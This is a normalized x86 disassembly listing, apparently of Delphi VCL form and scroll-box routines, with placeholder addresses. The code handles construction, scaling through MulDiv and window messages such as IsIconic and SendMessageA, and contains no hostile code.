cmp [ eax + 0x1f ] 0x0
je r-xdata
sub_45233c
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_43ca84
mov eax [ esi + 0x50 ]
or eax [ r-xdata ]
mov [ esi + 0x50 ] eax
push 0x0
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4517b8
mov [ esi + 0x208 ] eax
push 0x1
mov ecx esi
mov dl 0x1
mov eax [ r-xdata ]
call sub_4517b8
mov [ esi + 0x20c ] eax
mov [ esi + 0x210 ] 0x1
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4523b4
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x208 ]
call sub_403198
mov eax [ esi + 0x20c ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_43cba8
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_452400
push ebx
mov ebx eax
mov eax ebx
call sub_43dd10
mov eax [ rw-data ]
cmp [ eax + 0xd ] 0x0
jne r-xdata
mov eax ebx
call sub_452618
pop ebx
retn
mov edx 0x1
mov eax 0x5
call sub_40c1f8
test al al
jne r-xdata
mov eax ebx
call sub_440d58
push eax
call sub_425f38
sub_452440
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov eax ebx
call sub_452598
mov ecx edi
mov edx esi
mov eax ebx
call sub_43d458
pop edi
pop esi
pop ebx
retn
sub_452480
push ebp
mov ebp esp
add esp 0xfffffff0
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ ebp - 0x10 ] eax
xor eax eax
push ebp
push sub_452588
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_439f74
mov [ ebp - 0x8 ] eax
mov eax [ ebp - 0x4 ]
mov ebx [ eax + 0x208 ]
mov eax ebx
call sub_451a50
test al al
je r-xdata
xor eax eax
jmp r-xdata
mov eax [ ebx + 0x10 ]
cmp eax [ ebp - 0x8 ]
jg r-xdata
mov [ ebp - 0x9 ] al
cmp [ ebp - 0x9 ] 0x0
je r-xdata
mov al 0x1
mov eax [ ebp - 0x4 ]
call sub_43da88
mov esi eax
dec esi
test esi esi
jl r-xdata
mov eax [ ebx + 0x10 ]
mov [ ebp - 0x8 ] eax
xor edx edx
mov eax ebx
call sub_451fa0
mov eax [ ebp - 0x10 ]
mov esi [ eax + 0x8 ]
dec esi
test esi esi
jl r-xdata
inc esi
xor ebx ebx
cmp [ ebp - 0x9 ] 0x0
je r-xdata
inc esi
xor ebx ebx
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43da4c
mov edi eax
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43da4c
mov edx eax
mov eax [ ebp - 0x10 ]
call sub_413eec
mov edx [ ebp - 0x8 ]
sub edx [ edi + 0x48 ]
sub edx [ edi + 0x40 ]
mov eax edi
call sub_439ce0
inc ebx
dec esi
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_45258f
mov eax [ ebp - 0x10 ]
call sub_403198
retn
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_451898
push 0x0
mov edx ebx
mov eax [ ebp - 0x10 ]
call sub_414098
xor ecx ecx
mov edx 0xb03e
call sub_43b724
inc ebx
dec esi
jne r-xdata
sub_4525bc
push ebx
mov ebx eax
cmp dl [ ebx + 0x210 ]
je r-xdata
pop ebx
retn
mov [ ebx + 0x210 ] dl
test dl dl
je r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_4520f0
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_4520f0
mov eax ebx
call sub_452598
jmp r-xdata
sub_452618
push ebp
mov ebp esp
push ecx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x218 ] 0x0
jne r-xdata
pop ecx
pop ebp
retn
mov eax [ ebp - 0x4 ]
call sub_44105c
test al al
je r-xdata
xor eax eax
push ebp
push sub_452703
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
call sub_451bb8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
call sub_451bb8
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
mov cl 0x1
xor edx edx
call sub_452224
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
mov dl 0x1
call sub_452224
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
xor ecx ecx
xor edx edx
call sub_452224
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_452224
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
mov cl 0x1
xor edx edx
call sub_452224
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
xor ecx ecx
mov dl 0x1
call sub_452224
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_452728
push ebx
push esi
push edi
push ebp
add esp 0xffffffe0
mov esi edx
mov ebx eax
mov edi esp
test esi esi
je r-xdata
add esp 0x20
pop ebp
pop edi
pop esi
pop ebx
retn
mov edx edi
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x44 ]
mov eax [ ebx + 0x208 ]
movzx eax [ eax + 0x1a ]
sub [ edi ] eax
add [ edi + 0x8 ] eax
mov eax [ ebx + 0x20c ]
movzx eax [ eax + 0x1a ]
sub [ edi + 0x4 ] eax
add [ edi + 0xc ] eax
lea ecx [ esp + 0x18 ]
mov edx edi
mov eax esi
call sub_43a088
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43a0b4
mov eax [ esp + 0x10 ]
mov [ edi ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0x4 ] eax
lea ecx [ esp + 0x18 ]
lea edx [ edi + 0x8 ]
mov eax esi
call sub_43a088
lea edx [ esp + 0x18 ]
lea ecx [ esp + 0x10 ]
mov eax ebx
call sub_43a0b4
mov eax [ esp + 0x10 ]
mov [ edi + 0x8 ] eax
mov eax [ esp + 0x14 ]
mov [ edi + 0xc ] eax
mov esi [ edi ]
test esi esi
jge r-xdata
mov eax ebx
call sub_439f74
mov ebp [ edi + 0x8 ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x208 ]
mov edx [ eax + 0xc ]
add edx esi
call sub_451fa0
jmp r-xdata
mov esi [ edi + 0x4 ]
test esi esi
jge r-xdata
mov eax ebx
call sub_439f74
sub ebp esi
cmp eax ebp
jge r-xdata
mov eax ebx
call sub_439fb8
mov ebp [ edi + 0xc ]
cmp eax ebp
jge r-xdata
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
add edx esi
call sub_451fa0
jmp r-xdata
mov esi [ ebx + 0x208 ]
mov eax ebx
call sub_439f74
mov edx [ esi + 0xc ]
add edx [ edi + 0x8 ]
sub edx eax
mov eax esi
call sub_451fa0
mov eax ebx
call sub_439f74
add eax [ edi ]
mov [ edi + 0x8 ] eax
mov eax ebx
call sub_439fb8
sub ebp esi
cmp eax ebp
jge r-xdata
mov esi [ ebx + 0x20c ]
mov eax ebx
call sub_439fb8
mov edx [ esi + 0xc ]
add edx [ edi + 0xc ]
sub edx eax
mov eax esi
call sub_451fa0
mov eax ebx
call sub_439fb8
add eax [ edi + 0x4 ]
mov [ edi + 0xc ] eax
sub_45287c
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
cmp edi esi
je r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x0
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x0
pop ebp
pop edi
pop esi
pop ebx
retn
test [ ebx + 0x1c ] 0x1
jne r-xdata
xor edx edx
mov eax [ ebx + 0x208 ]
call sub_451fa0
xor edx edx
mov eax [ ebx + 0x20c ]
call sub_451fa0
cmp [ ebx + 0x210 ] 0x0
jne r-xdata
mov eax [ ebx + 0x208 ]
mov [ eax + 0x1e ] 0x1
mov eax [ ebx + 0x20c ]
mov [ eax + 0x1e ] 0x1
mov ebp [ ebx + 0x208 ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
mov ebp [ ebx + 0x20c ]
cmp [ ebp + 0x1e ] 0x0
je r-xdata
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4520f0
push edi
push esi
mov eax [ ebp + 0x10 ]
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_4520f0
sub_452920
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45287c
mov ecx edi
mov edx esi
mov eax ebx
call sub_440864
pop edi
pop esi
pop ebx
retn
sub_452948
push ebp
mov ebp esp
push ecx
push ebx
mov ebx edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
inc [ eax + 0x214 ]
xor edx edx
push ebp
push sub_4529b2
push [ fs : edx ]
mov [ fs : edx ] esp
mov edx ebx
mov eax [ ebp - 0x4 ]
call sub_43f344
xor eax eax
mov edx [ ebx + 0x4 ]
sub edx 0x1
jb r-xdata
xor eax eax
jmp r-xdata
je r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
mov ecx [ eax ]
call [ ecx + 0xd0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4529b9
mov eax [ ebp - 0x4 ]
dec [ eax + 0x214 ]
retn
mov al 0x1
jmp r-xdata
dec edx
je r-xdata
mov al 0x2
jmp r-xdata
sub_4529b9
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x1
xor eax eax
push ebp
push sub_4529f1
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
call sub_452598
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_4529f8
mov eax [ ebp - 0x4 ]
mov [ eax + 0x218 ] 0x0
retn
sub_4529f8
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x208 ]
cmp [ eax + 0x1c ] 0x0
jne r-xdata
mov eax [ ebp - 0x4 ]
call sub_452618
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x20c ]
cmp [ eax + 0x1c ] 0x0
je r-xdata
pop ebx
pop ecx
pop ebp
retn
sub_452a6c
push ebx
push esi
push edi
add esp 0xfffffff0
mov esi edx
mov ebx eax
mov eax ebx
call sub_439fb8
mov edx [ ebx + 0x20c ]
mov edx [ edx + 0x10 ]
call sub_4242dc
push eax
lea eax [ esp + 0x4 ]
push eax
mov eax ebx
call sub_439f74
mov edx eax
mov edi [ ebx + 0x208 ]
mov eax [ edi + 0x10 ]
call sub_4242dc
mov ecx eax
mov eax [ ebx + 0x20c ]
mov edx [ eax + 0xc ]
neg edx
mov eax [ edi + 0xc ]
neg eax
call sub_412c08
push esi
mov edi esi
lea esi [ esp + 0x4 ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
movsd [ edi ] [ esi ]
pop esi
mov edx esi
mov eax ebx
call sub_43cdc4
add esp 0x10
pop edi
pop esi
pop ebx
retn
sub_452adc
push ebp
mov ebp esp
add esp 0xfffffff4
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x4 ]
mov [ ebp - 0xc ] eax
xor eax eax
push ebp
push sub_452b3d
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
mov edx [ rw-data ]
call sub_403324
test al al
jne r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_4400d4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452b44
mov eax [ ebp - 0x8 ]
mov edx [ ebp - 0xc ]
mov [ eax + 0x4 ] edx
retn
mov eax [ ebp - 0x8 ]
mov [ eax + 0x4 ] 0x1
sub_452b6c
push ebp
mov ebp esp
add esp 0xfffffeec
push ebx
xor ebx ebx
mov [ ebp - 0x114 ] ebx
test dl dl
je r-xdata
mov ebx ecx
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
xor eax eax
push ebp
push sub_452cd0
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor eax eax
push ebp
push sub_452cb0
push [ fs : eax ]
mov [ fs : eax ] esp
push 0x0
mov ecx ebx
xor edx edx
mov eax [ ebp - 0x4 ]
mov ebx [ eax ]
call [ ebx + 0xe0 ]
mov eax [ ebp - 0x4 ]
call sub_4030e0
cmp eax [ r-xdata ]
je r-xdata
add esp 0xfffffff0
call sub_4034bc
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452cb7
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x10
jne r-xdata
mov eax [ ebp - 0x4 ]
or [ eax + 0x2f4 ] 0x1
xor eax eax
push ebp
push sub_452c78
push [ fs : eax ]
mov [ fs : eax ] esp
mov edx [ r-xdata ]
mov eax [ ebp - 0x4 ]
call sub_413e08
test al al
jne r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push r-xdata
mov eax [ ebp - 0x4 ]
and [ eax + 0x2f4 ] 0xfe
retn
lea edx [ ebp - 0x110 ]
mov eax [ ebp - 0x4 ]
mov eax [ eax ]
call sub_4030e8
lea eax [ ebp - 0x110 ]
mov [ ebp - 0x10 ] eax
mov [ ebp - 0xc ] 0x4
lea eax [ ebp - 0x10 ]
push eax
push 0x0
lea edx [ ebp - 0x114 ]
mov eax [ rw-data ]
call sub_405af8
mov ecx [ ebp - 0x114 ]
mov dl 0x1
mov eax [ r-xdata ]
call sub_40ba04
call sub_403924
sub_452cf8
push ebx
push esi
mov ebx eax
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
test [ ebx + 0x2f4 ] 0x20
je r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd4 ]
pop esi
pop ebx
retn
mov eax ebx
mov si 0xffb3
call sub_403394
and [ ebx + 0x2f4 ] 0xdf
sub_452d30
push ebp
mov ebp esp
push ecx
push ebx
push esi
test dl dl
je r-xdata
mov [ ebp - 0x1 ] dl
mov ebx eax
xor edx edx
mov eax ebx
call sub_45233c
mov eax [ r-xdata ]
mov [ ebx + 0x50 ] eax
xor edx edx
mov eax ebx
call sub_439ce0
xor edx edx
mov eax ebx
call sub_439d04
mov edx 0x140
mov eax ebx
call sub_439d2c
mov edx 0xf0
mov eax ebx
call sub_439d50
mov dl 0x1
mov eax [ r-xdata ]
call sub_423820
mov esi eax
mov [ ebx + 0x240 ] esi
push 0x31
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax esi
mov ecx [ eax ]
call [ ecx + 0x40 ]
push 0x32
mov eax [ rw-data ]
mov eax [ eax ]
call eax
mov edx eax
mov eax [ ebx + 0x240 ]
mov ecx [ eax ]
call [ ecx + 0x34 ]
mov eax [ ebx + 0x240 ]
mov [ eax + 0x14 ] ebx
mov [ eax + 0x10 ] sub_45364c
mov dl 0x1
mov eax [ r-xdata ]
call sub_41d768
mov esi eax
mov [ ebx + 0x238 ] esi
mov eax esi
mov edx ebx
call sub_43914c
mov al [ r-xdata ]
mov [ ebx + 0x228 ] al
mov [ ebx + 0x229 ] 0x2
mov [ ebx + 0x22b ] 0x0
mov [ ebx + 0x231 ] 0x3
mov [ ebx + 0x244 ] 0x0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov [ ebx + 0x25c ] eax
mov [ ebx + 0x235 ] 0x1
mov eax ebx
call sub_4030e0
mov [ ebx + 0xb8 ] eax
mov [ ebx + 0x2e1 ] 0xff
xor eax eax
mov [ ebx + 0x2ec ] eax
xor edx edx
mov eax ebx
call sub_4539b0
xor edx edx
mov eax ebx
call sub_43a734
xor edx edx
mov eax ebx
call sub_43a69c
mov dl 0x1
mov eax ebx
call sub_440e98
mov edx ebx
mov eax [ rw-data ]
call sub_458014
mov [ ebx + 0x2e4 ] 0xa
mov eax ebx
cmp [ ebp - 0x1 ] 0x0
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax ebx
pop esi
pop ebx
pop ecx
pop ebp
retn 0x4
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_452ea9
add [ eax ] al
add [ ebx - 0x75 ] dl
fsub [ ecx + rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax ebx
call sub_419cf0
mov eax [ rw-data ]
mov eax [ eax + 0x7c ]
mov edx ebx
call sub_4141dc
xor edx edx
mov eax ebx
call sub_416c74
cmp [ ebx + 0x264 ] 0x0
je r-xdata
cmp [ ebx + 0x22f ] 0x1
je r-xdata
mov eax [ ebx + 0x264 ]
mov edx [ eax ]
call [ edx + 0xc ]
cmp [ ebx + 0x234 ] 0x0
jne r-xdata
mov eax ebx
call sub_456ebc
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0xd8 ]
sub_452f14
push ebp
mov ebp esp
add esp 0xfffffff8
call sub_403524
mov [ ebp - 0x5 ] dl
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x1c ] 0x8
jne r-xdata
xor eax eax
push ebp
push sub_452fde
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x234 ] 0x0
je r-xdata
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x14 ]
xor edx edx
mov eax [ ebp - 0x4 ]
call sub_455838
mov eax [ ebp - 0x4 ]
call sub_44105c
test al al
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xd8 ]
mov edx [ ebp - 0x4 ]
mov eax [ rw-data ]
call sub_45804c
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x238 ]
call sub_403198
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x240 ]
call sub_403198
mov eax [ ebp - 0x4 ]
add eax 0x2f0
call sub_40d3ac
mov dl [ ebp - 0x5 ]
and dl 0xfc
mov eax [ ebp - 0x4 ]
call sub_4523b4
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_452fe5
mov eax [ rw-data ]
mov eax [ eax ]
mov edx [ eax ]
call [ edx + 0x18 ]
retn
mov eax [ ebp - 0x4 ]
mov edx [ eax ]
call [ edx + 0xac ]
sub_452ff8
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2d2 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
xor eax eax
push ebp
push sub_453039
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2d4 ]
call [ ebx + 0x2d0 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4539b0
sub_45303e
mov eax [ ebp - 0x4 ]
mov si 0xffad
call sub_403394
test al al
jne r-xdata
call sub_4039a0
mov eax [ ebp - 0x4 ]
test [ eax + 0x2f4 ] 0x2
je r-xdata
call sub_40394c
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
mov dl 0x1
mov eax [ ebp - 0x4 ]
call sub_4539b0
sub_453074
push ebp
mov ebp esp
push ecx
push ebx
push esi
push edi
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x2da ] 0x0
je r-xdata
pop edi
pop esi
pop ebx
pop ecx
pop ebp
retn
xor eax eax
push ebp
push sub_4530b5
push [ fs : eax ]
mov [ fs : eax ] esp
mov ebx [ ebp - 0x4 ]
mov edx [ ebp - 0x4 ]
mov eax [ ebx + 0x2dc ]
call [ ebx + 0x2d8 ]
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
jmp r-xdata
sub_4530d4
push ebx
push esi
push edi
mov ebx eax
mov eax ebx
call sub_43c62c
mov eax [ ebx + 0x220 ]
test eax eax
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi eax
xor eax eax
mov [ ebx + 0x220 ] eax
mov eax edi
mov si 0xffb8
call sub_403394
test al al
je r-xdata
mov edx edi
mov eax ebx
call sub_45537c
sub_453110
push ebx
push esi
push edi
push ebp
mov ebx ecx
mov esi edx
mov edi eax
mov ecx ebx
mov edx esi
mov eax edi
call sub_439a40
mov eax ebx
sub al 0x1
jb r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
je r-xdata
test [ edi + 0x1c ] 0x1
jne r-xdata
cmp [ edi + 0x2f0 ] 0x0
jne r-xdata
mov ebp [ edi + 0x2f0 ]
test ebp ebp
je r-xdata
jmp r-xdata
cmp [ edi + 0x250 ] 0x0
je r-xdata
cmp [ edi + 0x248 ] 0x0
jne r-xdata
mov edx esi
mov eax [ edi + 0x2f0 ]
call sub_413eec
jmp r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ edi + 0x2f0 ] eax
cmp esi [ edi + 0x248 ]
jne r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
mov ecx ebx
mov edx esi
mov eax [ edi + 0x250 ]
mov ebx [ eax ]
call [ ebx + 0x10 ]
cmp edi [ esi + 0x4 ]
jne r-xdata
cmp esi [ edi + 0x258 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_454774
mov edx esi
mov eax ebp
call sub_4141dc
jmp r-xdata
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
cmp esi [ edi + 0x260 ]
jne r-xdata
xor edx edx
mov eax edi
call sub_45474c
mov edx esi
mov eax edi
call sub_454774
jmp r-xdata
xor edx edx
mov eax edi
call sub_454728
sub_45321c
push ebp
mov ebp esp
push ecx
push ebx
push esi
mov esi edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp - 0x4 ]
call sub_43d5f0
xor edx edx
push ebp
push sub_453472
push [ fs : edx ]
mov [ fs : edx ] esp
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x268 ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x26c ] edx
mov eax [ ebp - 0x4 ]
xor edx edx
mov [ eax + 0x270 ] edx
xor ebx ebx
mov al [ rw-data ]
xor al 0x1
mov edx [ ebp - 0x4 ]
mov [ edx + 0x234 ] al
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_43cd4c
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x25c ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
test eax eax
jle r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x270 ] 0x0
jle r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
test eax eax
jle r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_439f8c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x10
je r-xdata
mov eax [ ebp - 0x4 ]
mov dl [ r-xdata ]
mov [ eax + 0x98 ] dl
test bl bl
jne r-xdata
mov edx eax
mov eax [ ebp - 0x4 ]
call sub_439fd0
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
mov edx [ ebp - 0x4 ]
mov [ edx + 0x25c ] eax
mov eax [ ebp - 0x4 ]
call sub_4535a4
mov esi eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
cmp esi eax
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
mov edx [ rw-data ]
cmp eax [ edx + 0x40 ]
je r-xdata
push 0x0
xor ecx ecx
mov edx 0xb03d
mov eax [ ebp - 0x4 ]
call sub_43b724
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_453479
mov eax [ ebp - 0x4 ]
call sub_43d5f8
retn
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_45287c
mov ecx 0x1
mov edx 0x1
mov eax [ ebp - 0x4 ]
call sub_44081c
mov bl 0x1
mov ecx eax
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_45287c
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x270 ]
mov edx esi
mov eax [ ebp - 0x4 ]
call sub_44081c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x4
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x25c ]
push eax
mov eax [ rw-data ]
mov eax [ eax + 0x40 ]
push eax
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x68 ]
mov eax esi
call sub_41d004
push eax
call MulDiv
mov edx eax
mov eax esi
call sub_41d00c
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x8
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x268 ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x268 ] eax
mov eax [ ebp - 0x4 ]
test [ eax + 0x98 ] 0x20
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x26c ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x26c ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fa ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fa ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x270 ]
push eax
push esi
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x1fe ]
push eax
call MulDiv
mov edx [ ebp - 0x4 ]
mov [ edx + 0x1fe ] eax
sub_453481
add [ eax ] al
add [ ebx + 0x56 ] dl
push edi
mov esi edx
mov ebx eax
mov edx esi
mov eax ebx
call sub_43e098
push 0x0
push 0x0
push ebx
push sub_453588
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push sub_453554
push ebx
push sub_45356c
mov cl [ ebx + 0x5e ]
xor cl 0x1
mov edx r-xdata
mov eax esi
mov edi [ eax ]
call [ edi + 0x4 ]
push ebx
push r-xdata
push 0x0
push 0x0
xor ecx ecx
mov edx r-xdata
mov eax esi
mov ebx [ eax ]
call [ ebx + 0x4 ]
pop edi
pop esi
pop ebx
retn
sub_453533
add [ ebx + 0x56 ] dl
mov esi edx
mov ebx eax
mov eax esi
call sub_41736c
test al al
je r-xdata
pop esi
pop ebx
retn
mov dl 0x1
mov eax ebx
call sub_43a69c
sub_4535bf
inc [ ecx ]
add [ eax ] al
add [ eax ] dh
add [ eax ] al
add bl al
lea eax [ eax ]
push ebx
push esi
push edi
push ebp
mov edi ecx
mov esi edx
mov ebx eax
mov ecx edi
mov edx esi
mov eax ebx
call sub_45287c
mov ecx edi
mov edx esi
mov eax ebx
call sub_44081c
mov eax ebx
call sub_4536a8
test al al
je r-xdata
push edi
push esi
mov ebp [ ebx + 0x68 ]
mov eax ebp
call sub_41d0a8
push eax
call MulDiv
mov edx eax
mov eax ebp
call sub_41d0c4
pop ebp
pop edi
pop esi
pop ebx
retn
mov eax ebx
call sub_439fb8
mov ebp eax
push edi
push esi
mov eax ebx
call sub_439f74
push eax
call MulDiv
mov edx eax
mov eax ebx
call sub_453950
push edi
push esi
push ebp
call MulDiv
mov edx eax
mov eax ebx
call sub_453980
sub_45364c
push ebx
mov ebx eax
mov eax [ rw-data ]
cmp [ eax ] 0x0
je r-xdata
mov eax ebx
call sub_440d58
push eax
call IsIconic
test eax eax
je r-xdata
mov eax ebx
call sub_44105c
test al al
je r-xdata
pop ebx
retn
mov eax ebx
mov edx [ eax ]
call [ edx + 0x7c ]
cmp [ ebx + 0x229 ] 0x3
je r-xdata
mov eax ebx
call sub_4559ac
push eax
push 0x1
push 0x80
mov eax ebx
call sub_440d58
push eax
call SendMessageA
pop ebx
retn
sub_4536e0
push ebx
mov ebx eax
mov eax ebx
call sub_4545fc
test al al
je r-xdata
xor eax eax
pop ebx
retn
mov al [ ebx + 0x229 ]
sub al 0x2
je r-xdata
mov al 0x1
sub al 0x3
je r-xdata
mov al 0x1
pop ebx
retn
xor eax eax
jmp r-xdata
cmp al [ ebx + 0x210 ]
jne r-xdata
sub_453774
push ebx
push esi
mov esi edx
mov ebx eax
mov eax ebx
call sub_440d58
push eax
call IsIconic
test eax eax
je r-xdata
